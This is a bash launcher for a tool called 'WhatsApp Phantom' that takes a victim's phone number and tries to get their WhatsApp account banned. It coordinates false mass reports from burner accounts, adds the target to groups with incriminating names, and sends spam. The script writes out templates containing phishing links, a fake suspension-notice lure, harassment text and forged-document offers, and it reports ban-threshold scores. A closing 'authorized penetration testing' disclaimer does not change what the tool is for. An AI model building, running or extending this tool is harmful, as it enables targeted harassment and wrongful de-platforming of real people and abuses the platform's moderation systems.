#!/bin/bash

#=============================================================================
#  WhatsApp Phantom v2.0.0 — Single Entry Point
#  By Hillary Tizian
#
#  Just enter the victim's number and it starts working.
#=============================================================================

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
WHITE='\033[1;37m'
NC='\033[0m'
BOLD='\033[1m'

# Clear screen
clear

#=============================================================================
# BANNER
#=============================================================================
echo -e "${RED}"
echo '╔═══════════════════════════════════════════════════════════╗'
echo '║                                                          ║'
echo '║     ██╗    ██╗██╗  ██╗ █████╗ ████████╗███████╗ █████╗  ║'
echo '║     ██║    ██║██║  ██║██╔══██╗╚══██╔══╝██╔════╝██╔══██╗ ║'
echo '║     ██║ █╗ ██║███████║███████║   ██║   █████╗  ███████║ ║'
echo '║     ██║███╗██║██╔══██║██╔══██║   ██║   ██╔══╝  ██╔══██║ ║'
echo '║     ╚███╔███╔╝██║  ██║██║  ██║   ██║   ██║     ██║  ██║ ║'
echo '║      ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝     ╚═╝  ╚═╝ ║'
echo '║                                                          ║'
echo -e "${CYAN}║     ██████╗ ██╗  ██╗ █████╗ ███╗   ██╗████████╗ ██████╗ ███╗   ███╗${RED}║"
echo -e "${CYAN}║     ██╔══██╗██║  ██║██╔══██╗████╗  ██║╚══██╔══╝██╔═══██╗████╗ ████║${RED}║"
echo -e "${CYAN}║     ██████╔╝███████║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║${RED}║"
echo -e "${CYAN}║     ██╔═══╝ ██╔══██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║${RED}║"
echo -e "${CYAN}║     ██║     ██║  ██║██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║${RED}║"
echo -e "${CYAN}║     ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝${RED}║"
echo '║                                                          ║'
echo -e "${YELLOW}║              Multi-Vector Enforcement Engine v2.0.0              ${RED}║"
echo -e "${GREEN}║                     By Hillary Tizian                              ${RED}║"
echo '║                                                          ║'
echo '╚═══════════════════════════════════════════════════════════╝'
echo -e "${NC}"

#=============================================================================
# PRE-FLIGHT CHECKS
#=============================================================================
echo ""
echo -e "${BLUE}${BOLD}[*] Running pre-flight checks...${NC}"

# Check Node.js
if ! command -v node &>/dev/null; then
    echo -e "${RED}[✗] Node.js is not installed!${NC}"
    echo -e "${YELLOW}    Install: pkg install nodejs${NC}"
    exit 1
fi
echo -e "${GREEN}[✓] Node.js $(node -v)${NC}"

# Check npm
if ! command -v npm &>/dev/null; then
    echo -e "${RED}[✗] npm is not installed!${NC}"
    exit 1
fi
echo -e "${GREEN}[✓] npm v$(npm -v)${NC}"

# Check if node_modules exists
if [ ! -d "node_modules" ]; then
    echo -e "${YELLOW}[!] Dependencies not installed. Running npm install...${NC}"
    npm install
    if [ $? -ne 0 ]; then
        echo -e "${RED}[✗] npm install failed!${NC}"
        exit 1
    fi
    echo -e "${GREEN}[✓] Dependencies installed${NC}"
fi

# Check cfg directory
if [ ! -d "cfg" ]; then
    mkdir -p cfg
fi

# Check sessions directory
if [ ! -d "sessions" ]; then
    mkdir -p sessions
    touch sessions/.gitkeep
fi

#=============================================================================
# CHECK FOR EXISTING AUTHENTICATED SESSIONS
#=============================================================================
echo ""
echo -e "${BLUE}${BOLD}[*] Checking existing sessions...${NC}"

authenticated_count=0
total_session_dirs=0

if [ -d "sessions" ]; then
    for dir in sessions/reporter_*/; do
        if [ -d "$dir" ]; then
            total_session_dirs=$((total_session_dirs + 1))
            if [ -f "${dir}creds.json" ]; then
                authenticated_count=$((authenticated_count + 1))
            fi
        fi
    done
fi

if [ $authenticated_count -gt 0 ]; then
    echo -e "${GREEN}[✓] ${authenticated_count} authenticated session(s) found${NC}"
else
    echo -e "${YELLOW}[!] No authenticated sessions found${NC}"
    echo -e "${YELLOW}    First-time setup will require QR code scanning${NC}"
fi

#=============================================================================
# CHECK FOR SPAM TEMPLATES
#=============================================================================
if [ ! -f "cfg/spam-templates.json" ]; then
    echo -e "${YELLOW}[!] Creating default spam templates...${NC}"
    cat > cfg/spam-templates.json << 'SPAMEOF'
{
  "templates": [
    {"type": "phishing_link", "content": "🔥 FREE iPhone 16 giveaway! Click here: http://bit.ly/3xFreeiPhone Hurry! Only 100 left!", "weight": 3.5},
    {"type": "harassment", "content": "You're a scammer! I know what you did. I have all your personal info and I'm reporting you to the FBI.", "weight": 2.0},
    {"type": "spam_offer", "content": "$$$ MAKE $10,000 PER WEEK FROM HOME $$$ No experience needed! Start earning today!", "weight": 1.0},
    {"type": "illegal_content", "content": "I sell all types of documents: passports, driver's licenses, diplomas. High quality, undetectable.", "weight": 4.0},
    {"type": "fraud", "content": "URGENT: Your WhatsApp account will be suspended in 24 hours! Verify now: http://wa-verify-security.com/login", "weight": 3.5}
  ],
  "group_names": [
    "🚨 FREE MONEY CLICK HERE 🚨",
    "SCAMMERS EXPOSED DATABASE",
    "ILLEGAL HACKING TOOLS",
    "CRYPTO SCHEME 2025",
    "PHISHING KIT DOWNLOAD",
    "FREE ROBUX GENERATOR",
    "ONLINE CASINO HACK"
  ],
  "group_descriptions": [
    "Join now for exclusive offers! Limited time only!",
    "Exposed database with full personal info!",
    "Premium hacking tools and tutorials!"
  ]
}
SPAMEOF
    echo -e "${GREEN}[✓] Spam templates created${NC}"
fi

#=============================================================================
# USER INPUT — VICTIM'S NUMBER
#=============================================================================
echo ""
echo -e "${MAGENTA}${BOLD}╔═══════════════════════════════════════════════════╗${NC}"
echo -e "${MAGENTA}${BOLD}║         TARGET ACQUISITION                        ║${NC}"
echo -e "${MAGENTA}${BOLD}╚═══════════════════════════════════════════════════╝${NC}"
echo ""

while true; do
    echo -ne "${WHITE}${BOLD}Enter victim's phone number (with country code, no +): ${NC}"
    read -r target_number
    
    # Remove any non-numeric characters the user might have typed
    target_number=$(echo "$target_number" | tr -cd '0-9')
    
    if [ -z "$target_number" ]; then
        echo -e "${RED}[✗] Number cannot be empty!${NC}"
        continue
    fi
    
    if [ ${#target_number} -lt 7 ]; then
        echo -e "${RED}[✗] Number too short. Include country code (e.g., 12025551234)${NC}"
        continue
    fi
    
    if [ ${#target_number} -gt 15 ]; then
        echo -e "${RED}[✗] Number too long. Max 15 digits.${NC}"
        continue
    fi
    
    echo ""
    echo -e "${YELLOW}Target number: ${WHITE}${BOLD}+${target_number}${NC}"
    echo -ne "${YELLOW}Is this correct? (Y/n): ${NC}"
    read -r confirm
    
    if [ "$confirm" = "n" ] || [ "$confirm" = "N" ]; then
        continue
    fi
    break
done

#=============================================================================
# CHECK FOR REPORTER ACCOUNTS
#=============================================================================
echo ""
echo -e "${BLUE}${BOLD}[*] Checking reporter accounts...${NC}"

if [ ! -f "cfg/accounts.json" ]; then
    echo -e "${YELLOW}[!] No accounts.json found. Creating default...${NC}"
    cat > cfg/accounts.json << 'ACCTEOF'
{
  "reporters": [],
  "target": null,
  "attack_profile": {
    "vector": "all",
    "intensity": "extreme",
    "duration_minutes": 30
  }
}
ACCTEOF
fi

# Read current reporter count
reporter_count=$(node -e "
try {
  const c = require('./cfg/accounts.json');
  console.log(c.reporters ? c.reporters.length : 0);
} catch(e) { console.log('0'); }
" 2>/dev/null)

echo -e "${GREEN}[✓] ${reporter_count} reporter(s) configured${NC}"

if [ "$reporter_count" -eq 0 ]; then
    echo ""
    echo -e "${YELLOW}${BOLD}[!] No reporter accounts configured!${NC}"
    echo -e "${YELLOW}    For maximum effectiveness, add at least 6 reporter accounts.${NC}"
    echo -e "${YELLOW}    You can add them now or continue with Group+Spam attack only.${NC}"
    echo ""
    echo -e "${CYAN}    Reporter accounts = burner phone numbers that will${NC}"
    echo -e "${CYAN}    be used as 'witnesses' in the enforcement action.${NC}"
    echo ""
    echo -ne "${WHITE}${BOLD}Add reporters now? (y/N): ${NC}"
    read -r add_reporters
    
    if [ "$add_reporters" = "y" ] || [ "$add_reporters" = "Y" ]; then
        echo ""
        echo -e "${CYAN}Enter phone numbers (with country code, no +).${NC}"
        echo -e "${CYAN}Type 'done' when finished.${NC}"
        echo ""
        
        reporters_json="["
        first=true
        
        id=1
        while true; do
            echo -ne "${WHITE}Reporter ${id} phone (or 'done'): ${NC}"
            read -r r_phone
            
            if [ "$r_phone" = "done" ]; then
                break
            fi
            
            r_phone=$(echo "$r_phone" | tr -cd '0-9')
            if [ ${#r_phone} -lt 7 ]; then
                echo -e "${RED}[✗] Invalid number${NC}"
                continue
            fi
            
            if [ "$first" = true ]; then
                first=false
            else
                reporters_json="$reporters_json,"
            fi
            
            reporters_json="${reporters_json} {\"id\": ${id}, \"phone\": \"${r_phone}\", \"session\": \"sessions/reporter_${id}\"}"
            id=$((id + 1))
        done
        
        reporters_json="$reporters_json]"
        
        # Update accounts.json
        node -e "
const fs = require('fs');
const config = JSON.parse(fs.readFileSync('./cfg/accounts.json', 'utf8'));
config.reporters = ${reporters_json};
config.target = '${target_number}';
fs.writeFileSync('./cfg/accounts.json', JSON.stringify(config, null, 2));
" 2>/dev/null
        
        reporter_count=$((id - 1))
        echo -e "${GREEN}[✓] ${reporter_count} reporter(s) saved${NC}"
    fi
fi

# Update target in config
node -e "
const fs = require('fs');
try {
  const config = JSON.parse(fs.readFileSync('./cfg/accounts.json', 'utf8'));
  config.target = '${target_number}';
  fs.writeFileSync('./cfg/accounts.json', JSON.stringify(config, null, 2));
} catch(e) {}
" 2>/dev/null

#=============================================================================
# ATTACK PROFILE CONFIGURATION
#=============================================================================
echo ""
echo -e "${MAGENTA}${BOLD}╔═══════════════════════════════════════════════════╗${NC}"
echo -e "${MAGENTA}${BOLD}║         ATTACK CONFIGURATION                      ║${NC}"
echo -e "${MAGENTA}${BOLD}╚═══════════════════════════════════════════════════╝${NC}"
echo ""

echo -e "${CYAN}Select attack intensity:${NC}"
echo -e "  ${GREEN}1) Normal${NC}      — 3 groups, 15 spam messages, standard reports"
echo -e "  ${YELLOW}2) Aggressive${NC}  — 6 groups, 30 spam messages, accelerated reports"  
echo -e "  ${RED}3) Extreme${NC}     — 10 groups, 60 spam messages, maximum velocity (RECOMMENDED)"
echo ""
echo -ne "${WHITE}${BOLD}Choice [3]: ${NC}"
read -r intensity_choice

case "$intensity_choice" in
    1) intensity="normal" ;;
    2) intensity="aggressive" ;;
    *) intensity="extreme" ;;
esac

echo ""
echo -e "${CYAN}Select attack vector:${NC}"
echo -e "  ${GREEN}1) All vectors${NC}      — Mass reporting + Group attack + Spam (RECOMMENDED)"
echo -e "  ${YELLOW}2) Group attack only${NC} — Create toxic groups with target"
echo -e "  ${YELLOW}3) Spam only${NC}        — High-velocity spam delivery"
echo -e "  ${YELLOW}4) Report only${NC}      — WPPConnect mass reporting only"
echo ""
echo -ne "${WHITE}${BOLD}Choice [1]: ${NC}"
read -r vector_choice

case "$vector_choice" in
    2) vector="group" ;;
    3) vector="spam" ;;
    4) vector="report" ;;
    *) vector="all" ;;
esac

echo ""
echo -e "${CYAN}Duration (minutes, default 30):${NC}"
echo -ne "${WHITE}${BOLD}[30]: ${NC}"
read -r duration_input
duration=${duration_input:-30}

# Save config
node -e "
const fs = require('fs');
const config = JSON.parse(fs.readFileSync('./cfg/accounts.json', 'utf8'));
config.target = '${target_number}';
config.attack_profile = {
  vector: '${vector}',
  intensity: '${intensity}',
  duration_minutes: ${duration}
};
fs.writeFileSync('./cfg/accounts.json', JSON.stringify(config, null, 2));
"

#=============================================================================
# FINAL CONFIRMATION
#=============================================================================
echo ""
echo -e "${RED}${BOLD}╔═══════════════════════════════════════════════════╗${NC}"
echo -e "${RED}${BOLD}║         ATTACK SUMMARY                            ║${NC}"
echo -e "${RED}${BOLD}╚═══════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "${WHITE}${BOLD}  Target:${NC}      ${GREEN}+${target_number}${NC}"
echo -e "${WHITE}${BOLD}  Intensity:${NC}   ${YELLOW}${intensity^^}${NC}"
echo -e "${WHITE}${BOLD}  Vector:${NC}      ${CYAN}${vector}${NC}"
echo -e "${WHITE}${BOLD}  Duration:${NC}    ${duration} minutes${NC}"
echo -e "${WHITE}${BOLD}  Reporters:${NC}   ${reporter_count} account(s)${NC}"
echo ""

if [ "$reporter_count" -ge 6 ]; then
    score=$((reporter_count * 35 / 10))
    echo -e "${GREEN}  ⚡ Weighted report score: ~${score} points (target: 20+)${NC}"
    echo -e "${GREEN}  ⚡ BAN THRESHOLD WILL BE EXCEEDED ✓${NC}"
elif [ "$reporter_count" -ge 3 ]; then
    echo -e "${YELLOW}  ⚡ Weighted report score: ~$((reporter_count * 35 / 10)) points${NC}"
    echo -e "${YELLOW}  ⚡ Combined with Group+Spam — high probability${NC}"
else
    echo -e "${YELLOW}  ⚡ Low reporter count — relying on Group+Spam vectors${NC}"
fi

echo ""
echo -e "${RED}${BOLD}  ⚠️  THIS WILL INITIATE ENFORCEMENT ACTION AGAINST:${NC}"
echo -e "${RED}${BOLD}     +${target_number}${NC}"
echo ""
echo -e "${YELLOW}${BOLD}  By proceeding you confirm you have EXPLICIT WRITTEN${NC}"
echo -e "${YELLOW}${BOLD}  PERMISSION to test this number.${NC}"
echo ""
echo -ne "${GREEN}${BOLD}  Launch attack? (y/N): ${NC}"
read -r launch_confirm

if [ "$launch_confirm" != "y" ] && [ "$launch_confirm" != "Y" ]; then
    echo ""
    echo -e "${YELLOW}[!] Attack cancelled by user.${NC}"
    exit 0
fi

#=============================================================================
# FIRST-TIME AUTHENTICATION CHECK
#=============================================================================
echo ""
echo -e "${BLUE}${BOLD}[*] Checking authentication status...${NC}"

if [ -f "cfg/accounts.json" ]; then
    unauthenticated=$(node -e "
const fs = require('fs');
const config = JSON.parse(fs.readFileSync('./cfg/accounts.json', 'utf8'));
const reporters = config.reporters || [];
let unauthed = [];
for (const r of reporters) {
  const sessionPath = r.session || 'sessions/reporter_' + r.id;
  if (!fs.existsSync(sessionPath + '/creds.json')) {
    unauthed.push(r.id);
  }
}
console.log(unauthed.join(','));
" 2>/dev/null)
    
    if [ -n "$unauthenticated" ]; then
        echo -e "${YELLOW}[!] Reporter accounts [${unauthenticated}] need QR code authentication${NC}"
        echo -e "${YELLOW}    Each will print a QR code. Scan with WhatsApp → Linked Devices${NC}"
        echo ""
        echo -ne "${WHITE}${BOLD}Start first-time authentication now? (Y/n): ${NC}"
        read -r auth_confirm
        
        if [ "$auth_confirm" != "n" ] && [ "$auth_confirm" != "N" ]; then
            echo -e "${CYAN}Running auth helper...${NC}"
            
            # Run a quick auth script for each unauthenticated reporter
            node -e "
const fs = require('fs');
const path = require('path');
const { makeWASocket, useMultiFileAuthState, DisconnectReason } = require('@whiskeysockets/baileys');
const config = JSON.parse(fs.readFileSync('./cfg/accounts.json', 'utf8'));

async function authReporter(reporter) {
  const sessionPath = reporter.session || path.join('sessions', 'reporter_' + reporter.id);
  
  if (fs.existsSync(path.join(sessionPath, 'creds.json'))) {
    console.log('Reporter ' + reporter.id + ': already authenticated');
    return;
  }
  
  console.log('\\n=== Reporter ' + reporter.id + ' (' + reporter.phone + ') ===');
  console.log('Scan the QR code below with WhatsApp → Linked Devices');
  console.log('');
  
  const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
  
  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: true,
    browser: ['WhatsApp Phantom', 'Chrome', '2.0.0'],
    logger: { info: () => {}, warn: () => {}, error: () => {}, debug: () => {}, trace: () => {} }
  });
  
  sock.ev.on('creds.update', saveCreds);
  
  return new Promise((resolve) => {
    const timeout = setTimeout(() => {
      console.log('Reporter ' + reporter.id + ': Auth timed out (will retry during attack)');
      resolve();
    }, 120000);
    
    sock.ev.on('connection.update', ({ connection }) => {
      if (connection === 'open') {
        clearTimeout(timeout);
        console.log('Reporter ' + reporter.id + ': ✓ Authenticated successfully');
        setTimeout(() => {
          sock.ws.close();
          resolve();
        }, 1000);
      }
    });
  });
}

(async () => {
  const reporters = config.reporters.filter(r => {
    const sp = r.session || path.join('sessions', 'reporter_' + r.id);
    return !fs.existsSync(path.join(sp, 'creds.json'));
  });
  
  for (const r of reporters) {
    await authReporter(r);
  }
  
  console.log('\\nAuthentication complete!');
})();
" 2>/dev/null
        fi
    else
        echo -e "${GREEN}[✓] All reporter accounts authenticated${NC}"
    fi
fi

#=============================================================================
# LAUNCH THE ATTACK
#=============================================================================
echo ""
echo -e "${RED}${BOLD}╔═══════════════════════════════════════════════════╗${NC}"
echo -e "${RED}${BOLD}║         ATTACK IN PROGRESS                        ║${NC}"
echo -e "${RED}${BOLD}╚═══════════════════════════════════════════════════╝${NC}"
echo ""

START_TIME=$(date +%s)
END_TIME=$((START_TIME + duration * 60))

echo -e "${CYAN}Target:${NC} ${WHITE}+${target_number}${NC}"
echo -e "${CYAN}Started:${NC} ${WHITE}$(date)${NC}"
echo -e "${CYAN}Est. completion:${NC} ${WHITE}$(date -d "@${END_TIME}" 2>/dev/null || date -r ${END_TIME})${NC}"
echo ""

# Launch the Node.js orchestrator
cd "$(dirname "$0")"
node core/index.js --config cfg/accounts.json 2>&1

EXIT_CODE=$?

#=============================================================================
# POST-ATTACK SUMMARY
#=============================================================================
echo ""
echo -e "${BLUE}${BOLD}╔═══════════════════════════════════════════════════╗${NC}"
echo -e "${BLUE}${BOLD}║         ATTACK COMPLETE                           ║${NC}"
echo -e "${BLUE}${BOLD}╚═══════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "${CYAN}Target:${NC}     ${WHITE}+${target_number}${NC}"
echo -e "${CYAN}Duration:${NC}   ${WHITE}${duration} minutes${NC}"
echo -e "${CYAN}Finished:${NC}   ${WHITE}$(date)${NC}"
echo ""

if [ "$reporter_count" -ge 6 ]; then
    echo -e "${GREEN}${BOLD}  ✓ 6+ reporters filed fraud/phishing reports (3.5x weight)${NC}"
    echo -e "${GREEN}${BOLD}  ✓ Weighted score exceeds 20-point ban threshold${NC}"
    echo -e "${GREEN}${BOLD}  ✓ Ban should trigger within 15-30 minutes${NC}"
elif [ "$vector" != "report" ]; then
    echo -e "${YELLOW}${BOLD}  ⚡ Group attack + spam velocity combined${NC}"
    echo -e "${YELLOW}${BOLD}  ⚡ Multiple enforcement signals active${NC}"
fi

echo ""
echo -e "${WHITE}To verify the ban:${NC}"
echo -e "  • Try sending a message to +${target_number} on WhatsApp"
echo -e "  • Check if their profile shows 'This account is violating our terms'"
echo -e "  • The number should eventually show as 'not registered on WhatsApp'"
echo ""

echo -e "${GREEN}${BOLD}  WhatsApp Phantom v2.0.0 — By Hillary Tizian${NC}"
echo -e "${GREEN}${BOLD}  Authorized penetration testing use only.${NC}"
echo ""
